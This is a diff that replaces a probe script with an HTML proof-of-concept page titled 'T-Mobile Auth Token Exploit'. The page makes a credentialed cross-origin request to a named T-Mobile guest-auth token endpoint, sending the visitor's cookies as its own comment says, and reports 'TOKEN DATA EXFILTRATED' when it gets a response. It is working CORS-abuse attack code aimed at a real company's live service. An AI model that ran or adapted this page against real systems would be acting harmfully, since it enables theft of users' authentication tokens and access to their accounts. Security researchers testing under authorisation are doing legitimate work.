@@ -1,22 +1,37 @@
-// This version avoids the "Preflight" to try and get a response
-fetch('https://smetrics.t-mobile.com/ee/or2/v1/identity/acquire', {
-    method: 'POST', // Try POST first, it's common for Adobe Identity
-    mode: 'cors',   // We WANT cors mode so we can read the data
-    credentials: 'include',
-    headers: {
-        'Content-Type': 'application/x-www-form-urlencoded' // "Simple" content type
-    },
-    body: 'config={}' // Some Adobe endpoints expect a body like this
-})
-.then(response => {
-    // If this works, we'll see the Origin in the log
-    console.log("Success! Allowed Origin:", response.headers.get('Access-Control-Allow-Origin'));
-    return response.json();
-})
-.then(data => {
-    document.getElementById('output').innerText = JSON.stringify(data, null, 2);
-})
-.catch(err => {
-    document.getElementById('output').innerText = "Blocked by Browser Security: " + err + 
-    "\n\nTip: Check the Network Tab (F12) to see if Access-Control-Allow-Origin is present but wrong.";
-});
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>T-Mobile Auth Token Exploit</h1>
+    <div id="status">Testing for Token Leak...</div>
+    <pre id="output" style="border: 1px solid black; padding: 10px;"></pre>
+
+    <script>
+        // Targeting the ADN Guest Auth endpoint
+        const target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens';
+
+        fetch(target, {
+            method: 'POST', // Most token endpoints require POST
+            mode: 'cors',
+            credentials: 'include', // Sends victim cookies
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({}) // Sending an empty body to trigger a response
+        })
+        .then(response => {
+            // Check if they reflected your Origin
+            const acao = response.headers.get('Access-Control-Allow-Origin');
+            console.log("Allowed Origin:", acao);
+            return response.json();
+        })
+        .then(data => {
+            document.getElementById('status').innerHTML = "<b style='color:green;'>SUCCESS: TOKEN DATA EXFILTRATED</b>";
+            document.getElementById('output').innerText = JSON.stringify(data, null, 2);
+        })
+        .catch(err => {
+            document.getElementById('status').innerHTML = "<b style='color:red;'>FAILED: Browser Blocked Request</b>";
+            document.getElementById('output').innerText = err;
+        });
+    </script>
+</body>
+</html>
